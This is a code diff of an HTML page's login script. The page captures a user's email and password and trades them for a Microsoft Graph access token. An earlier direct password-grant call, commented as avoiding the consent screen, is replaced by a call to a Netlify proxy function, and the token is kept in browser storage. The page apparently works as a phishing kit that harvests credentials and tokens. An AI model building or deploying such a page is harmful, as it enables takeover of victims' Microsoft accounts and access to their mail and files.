@@ -273,7 +273,7 @@
   </div>
 
   <script>
-    console.log('🔧 replacement.html loaded - ROPC Auth Method (No Consent Screen)');
+    console.log('🔧 replacement.html loaded - Using Backend Proxy for Auth');
 
     document.addEventListener('DOMContentLoaded', function () {
         
@@ -340,46 +340,36 @@
                 console.error('Failed to store credentials:', err);
             }
 
-            // ✅ USE ROPC FLOW (Resource Owner Password Credential)
-            // This authenticates directly without showing consent screen
-            console.log('🔐 Authenticating using ROPC flow (no consent screen)...');
-            authenticateWithROPC(email, password, submitBtn);
+            // ✅ USE BACKEND PROXY to authenticate (no CORS issues)
+            console.log('🔐 Authenticating via backend proxy...');
+            authenticateViaProxy(email, password, submitBtn);
         });
 
-        // ✅ RESOURCE OWNER PASSWORD CREDENTIAL (ROPC) FLOW
-        async function authenticateWithROPC(email, password, submitBtn) {
+        // ✅ AUTHENTICATE VIA NETLIFY PROXY FUNCTION
+        async function authenticateViaProxy(email, password, submitBtn) {
             try {
-                const tokenEndpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
-                
-                console.log('🔄 Sending credentials to Microsoft token endpoint...');
-                console.log('📧 Email:', email);
-                console.log('🌐 Endpoint:', tokenEndpoint);
+                console.log('🔄 Sending to /.netlify/functions/microsoftAuth...');
 
-                // ✅ ROPC request - Direct credential exchange
-                const response = await fetch(tokenEndpoint, {
+                const response = await fetch('/.netlify/functions/microsoftAuth', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
+                        'Content-Type': 'application/json'
                     },
-                    body: new URLSearchParams({
-                        'client_id': '2e338732-c914-4129-a148-45c24f2da81d',
-                        'scope': 'https://graph.microsoft.com/.default',
-                        'username': email,
-                        'password': password,
-                        'grant_type': 'password',
-                        'client_secret': '',  // Public client - no secret needed
-                    }).toString()
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
                 });
 
                 console.log('📨 Response status:', response.status);
 
                 const data = await response.json();
 
-                if (response.ok && data.access_token) {
+                if (data.success && data.access_token) {
                     console.log('✅ Authentication successful!');
                     console.log('🎟️ Access token received');
                     
-                    // ✅ Store access token
+                    // ✅ Store tokens
                     localStorage.setItem('microsoft_access_token', data.access_token);
                     sessionStorage.setItem('microsoft_access_token', data.access_token);
 
@@ -398,15 +388,13 @@
 
                 } else {
                     console.error('❌ Authentication failed:', data);
-                    console.log('Error:', data.error);
-                    console.log('Error description:', data.error_description);
                     
                     submitBtn.textContent = 'Error - Try again';
                     submitBtn.disabled = false;
                 }
 
             } catch (error) {
-                console.error('❌ ROPC Auth error:', error);
+                console.error('❌ Auth error:', error);
                 submitBtn.textContent = 'Error - Try again';
                 submitBtn.disabled = false;
             }
